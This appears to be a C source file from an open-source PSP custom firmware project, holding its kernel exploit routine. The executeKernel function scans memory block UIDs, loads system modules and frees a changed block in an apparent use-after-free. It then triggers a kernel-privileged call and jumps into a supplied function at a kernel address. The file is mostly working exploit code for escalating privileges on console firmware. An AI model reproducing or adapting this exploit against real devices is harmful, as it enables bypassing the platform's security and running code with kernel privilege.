/*
	Custom Emulator Firmware
	Copyright (C) 2012-2015, Total_Noob

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <module2.h>
#include <lflash0.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include "kxploit.h"
#include "functions.h"

#define MAX_UIDS 20

u32 address_list[MAX_UIDS];

int (* _sceKernelExitDeleteThread)(int status);
int (* _sceUtility_private_7EBD6208)();

void repairInstruction(void)
{
}

int load_thread()
{
	_sceUtility_private_7EBD6208();
	return _sceKernelExitDeleteThread(0);
}

int stubScanner(){
	return 0;
}

int doExploit(){
	return 0;
}

u32 FindImport(char* arg0, u32 arg1){
	return g_tbl->FindImportUserRam(arg0, arg1);
}

void executeKernel(u32 kernelContentFunction)
{
	/* Find imports in RAM */
	void (* _sceKernelDcacheWritebackAll)() = (void *)FindImport("UtilsForUser", 0x79D1C3FA);
	int (* _sceUtilityLoadModule)(int id) = (void *)FindImport("sceUtility", 0x2A2B3DE0);

	SceUID (* _sceKernelCreateThread)(const char *name, SceKernelThreadEntry entry, int initPriority, int stackSize, SceUInt attr, SceKernelThreadOptParam *option) = (void *)FindImport("ThreadManForUser", 0x446D8DE6);
	int (* _sceKernelStartThread)(SceUID thid, SceSize arglen, void *argp) = (void *)FindImport("ThreadManForUser", 0xF475845D);
	int (* _sceKernelWaitThreadEnd)(SceUID thid, SceUInt *timeout) = (void *)FindImport("ThreadManForUser", 0x278C0DF5);

	_sceKernelExitDeleteThread = (void *)FindImport("ThreadManForUser", 0x809CE29B);
	_sceUtility_private_7EBD6208 = (void *)FindImport("sceUtility_private", 0x7EBD6208);

	SceUID (* _sceKernelAllocMemoryBlock)(const char *name, int type, u32 size, void *params) = (void *)FindImport("SysMemUserForUser", 0xFE707FDF);
	int (* _sceKernelGetMemoryBlockAddr)(SceUID uid, void **ptr) = (void *)FindImport("SysMemUserForUser", 0xDB83A952);
	int (* _sceKernelFreeMemoryBlock)(SceUID uid) = (void *)FindImport("SysMemUserForUser", 0x50F61D8A);

	/* Load required module */
	_sceUtilityLoadModule(PSP_MODULE_NP_DRM);

	SceUID new_uid = _sceKernelAllocMemoryBlock("", PSP_SMEM_High, 1, NULL);

	SceUID uid_max = ((new_uid & 0xFFF00000) | 0x000FFFFF) + 0x100000;
	SceUID uid_min = uid_max - 0x200000;

	int i;
	SceUID uid;

	for(uid = uid_max, i = 0; uid > uid_min && i < MAX_UIDS; uid -= 2)
	{
		u32 addr = 0;
		_sceKernelGetMemoryBlockAddr(uid, (void *)&addr);

		if(addr & 0x80000000)
		{
			address_list[i] = addr;
			i++;
		}
	}

	/* Load first module */
	_sceUtilityLoadModule(PSP_MODULE_AV_G729);

	int (* _sceG729EncodeTermResource)() = (void *)FindImport("sceG729", 0x94714D50);

	int free = 0;

	for(uid = uid_max, i = 0; uid > uid_min && i < MAX_UIDS; uid -= 2)
	{
		u32 addr = 0;
		_sceKernelGetMemoryBlockAddr(uid, (void *)&addr);

		if(addr & 0x80000000)
		{
			if(address_list[i] != addr)
			{
				_sceKernelFreeMemoryBlock(uid);
				free = 1;
				break;
			}

			i++;
		}
	}

	/* Load second module */
/*	SceUID thid = _sceKernelCreateThread("load_thread", load_thread, 0x10, 0x1000, 0, NULL);
	_sceKernelStartThread(thid, 0, NULL);
	_sceKernelWaitThreadEnd(thid, NULL);*/
	_sceUtility_private_7EBD6208();

	_sceKernelDcacheWritebackAll();

	/* Execute with kernel privilege */
	_sceG729EncodeTermResource();

	/* Restore registers */
	asm("addiu $sp, $sp, -16\n");
	asm("move $s0, $k1\n");

	/* Execute kernel function */
	void (* execute)() = (void *)(kernelContentFunction | 0x80000000);
	execute();
}
